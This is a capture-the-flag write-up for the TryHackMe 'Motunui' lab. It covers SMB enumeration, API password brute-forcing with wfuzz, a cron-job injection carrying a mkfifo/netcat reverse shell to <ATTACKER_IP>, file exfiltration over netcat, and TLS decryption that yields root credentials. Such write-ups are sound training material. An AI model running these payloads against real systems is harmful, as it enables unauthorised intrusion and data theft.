# [Motunui](https://tryhackme.com/room/motunui)

## Hack the island of Motunui.

# Motunui

## Deploy the machine and get root privileges.

### What is the user flag?

1. First, we start with a comprehensive nmap scan to discover open ports and running services on the target machine.

```bash
nmap <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3000/tcp open  ppp
5000/tcp open  upnp
```

2. Since SMB ports are open, let's enumerate available shares using anonymous access.

```bash
smbclient -L //<TARGET_IP> -N
```

**Results:**

```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	traces          Disk      Network shared files
	IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
```

3. Connect to the `traces` share anonymously and list the available directories.

```bash
smbclient //<TARGET_IP>/traces -N
ls
```

**Results:**

```
moana                               D        0  Thu Jul  9 04:50:12 2020
maui                                D        0  Mon Aug  3 17:22:03 2020
tui                                 D        0  Thu Jul  9 04:50:40 2020
```

4. Use `smbget` to download all files from the share for offline analysis.

```bash
smbget -R smb://<TARGET_IP>/traces
```

**Results:**

```
Password for [guest] connecting to //<TARGET_IP>/traces:
Using workgroup WORKGROUP, user guest
smb://<TARGET_IP>/traces/moana/ticket_64947.pcapng
smb://<TARGET_IP>/traces/moana/ticket_31762.pcapng
smb://<TARGET_IP>/traces/maui/ticket_6746.pcapng
smb://<TARGET_IP>/traces/tui/ticket_7876.pcapng
smb://<TARGET_IP>/traces/tui/ticket_1325.pcapng
Downloaded 77.44kB in 3 seconds
```

5. Open `ticket_6746.pcapng` with Wireshark to analyze the network traffic.

6. The packet capture contains an HTTP image transfer. Export it using Wireshark's built-in feature. Navigate to: `File > Export Objects > HTTP`. Select the image file from the list and click "Save" to export it.

[SCREEN01]

The exported image is a screenshot showing a Virtual Host domain in the browser's address bar: `d3v3lopm3nt.motunui.thm`

7. Since the application uses virtual hosts, we need to add it to our hosts file for proper DNS resolution.

```bash
echo "<TARGET_IP> d3v3lopm3nt.motunui.thm" >> /etc/hosts
```

8. Use Gobuster to discover hidden directories and files on the development virtual host.

```bash
gobuster dir -u http://d3v3lopm3nt.motunui.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/docs                 (Status: 301) [Size: 333] [--> http://d3v3lopm3nt.motunui.thm/docs/]
/server-status        (Status: 403) [Size: 288]
```

9. Navigate to `/docs` which redirects to `http://d3v3lopm3nt.motunui.thm/docs/README.md`

```markdown
# Documentation for the in-development API

##### [Changelog](CHANGELOG.md) | [Issues](ISSUES.md)

Please do not distribute this documentation outside of the development team.

## Routes

Find all of the routes [here](ROUTES.md).
```

10. Visit `http://d3v3lopm3nt.motunui.thm/docs/ROUTES.md` to understand the API endpoints.

```markdown
# Routes

The base URL for the api is `api.motunui.thm:3000/v2/`.

### `POST /login`

Returns the hash for the specified user to be used for authorisation.

#### Parameters

- `username`
- `password`

#### Response (200)

{ "hash": String() }

#### Response (401)

{ "error": "invalid credentials" }

### ð\u0178\u201d `GET /jobs`

Returns all the cron jobs running as the current user.

#### Parameters

- `hash`

#### Response (200)

{ "jobs": Array() }

#### Response (403)

{ "error": "you are unauthorised to view this resource" }

### ð\u0178\u201d `POST /jobs`

Creates a new cron job running as the current user.

#### Parameters

- `hash`

#### Response (201)

{ "job": String() }

#### Response (401)

{ "error": "you are unauthorised to view this resource" }
```

11. Add the API subdomain to `/etc/hosts`.

```bash
echo "<TARGET_IP> api.motunui.thm" >> /etc/hosts
```

12. Attempt to authenticate using common credentials to test the v1 API endpoint.

```bash
curl -H 'Content-Type: application/json' -d '{"username":"user","password":"user"}' -XPOST http://api.motunui.thm:3000/v1/login
```

**Returns:**

```json
{ "message": "please get maui to update these routes" }
```

13. Use wfuzz to brute force the password for the `maui` user on the v2 API endpoint.

```bash
wfuzz -w /usr/share/wordlists/rockyou.txt -c -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' --hh 31 -t 50 http://api.motunui.thm:3000/v2/login
```

**Found password:** `island`

14. Authenticate as maui and retrieve the authentication hash

```bash
curl -H 'Content-Type: application/json' -d '{"username":"maui","password":"island"}' -XPOST http://api.motunui.thm:3000/v2/login
```

**Returns:**

```json
{ "hash": "aXNsYW5k" }
```

15. Prepare to receive the reverse shell connection on your attacking machine.

```bash
nc -lvnp 4444
```

16. Exploit the `/jobs` POST endpoint to create a cron job that executes every minute, establishing a reverse shell.

```bash
curl -H 'Content-Type: application/json' -d '{"hash":"aXNsYW5k","job":"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"}' -XPOST http://api.motunui.thm:3000/v2/jobs
```

17. Once connected as maui, explore the home directories and read moana's message.

```bash
cat /home/moana/read_me
```

**Result:**

```
I know you've been on vacation and the last thing you want is me nagging you.

But will you please consider not using the same password for all services? It puts us all at risk.

I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
```

18. Use find to locate `.pkt` files across the filesystem.

```bash
find / -type f -iname '*pkt' -ls 2>/dev/null
```

**Result:**

```
926350     76 -rwxrwxrwx   1 moana    moana       75918 Jul  9  2020 /etc/network.pkt
```

19. On your attacking machine, set up a netcat listener to receive the file:

```bash
nc -lvnp 8000 > network.pkt
```

20. On the target machine, send the file:

```bash
cat /etc/network.pkt | nc <ATTACKER_IP> 8000
```

21. Open the file in [Cisco Packet Tracer](https://www.netacad.com/resources/lab-downloads?courseLang=en-US).

22. In Packet Tracer, click on `Switch0`, go to the `CLI` tab, and execute the following commands to view the running configuration:

```
ena
show runn
```

[SCREEN02]

**Found credentials:** `moana:H0wF4ri'LLG0`

23. Use the discovered credentials to SSH into the machine as moana.

```bash
ssh moana@<TARGET_IP>
# Password: H0wF4ri'LLG0
```

24. Retrieve the user flag

```bash
cat /home/moana/user.txt
```

[SCREEN03]

---

### What is the root flag?

1. While exploring the system as moana, check for interesting files in `/etc/`.

```bash
cat /etc/ssl.txt
```

This file contains SSL/TLS session keys that can be used to decrypt HTTPS traffic in Wireshark.

2. Copy the content of `/etc/ssl.txt` into a local file named `ssl-keys.log` on your attacking machine.

3. Open `maui/ticket_6746.pcapng` again with Wireshark and configure it to use the SSL keylog file. Navigate to: `Edit > Preferences > Protocols > TLS`. In the `(Pre)-Master-Secret log filename` field select your `ssl-keys.log` file. Click `Apply` and then `OK`.

[SCREEN04]

Wireshark will now decrypt the TLS traffic in the capture.

4. Look for HTTP POST requests in the decrypted traffic. Filter by `http.request.method == "POST"` or look for "HTML Form" in the packet details.

[SCREEN05]

In the decrypted form data, you'll find root credentials being transmitted.

**Found Credentials:** `root:Pl3aseW0rk`

5. Use the discovered credentials to gain root access.

```bash
ssh root@<TARGET_IP>
# Password: Pl3aseW0rk
```

6. Retrieve the root flag

```bash
cat /root/root.txt
```

[SCREEN06]
